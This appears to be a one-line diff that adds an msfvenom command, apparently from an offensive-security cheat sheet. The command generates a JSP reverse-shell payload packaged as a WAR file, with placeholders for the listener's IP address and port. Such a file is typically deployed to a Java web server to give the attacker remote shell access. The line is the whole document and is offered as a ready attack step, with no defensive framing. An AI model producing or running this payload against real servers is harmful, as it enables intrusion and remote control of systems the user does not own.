@@ -1,0 +1,1 @@
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port> -f war -o shell.war
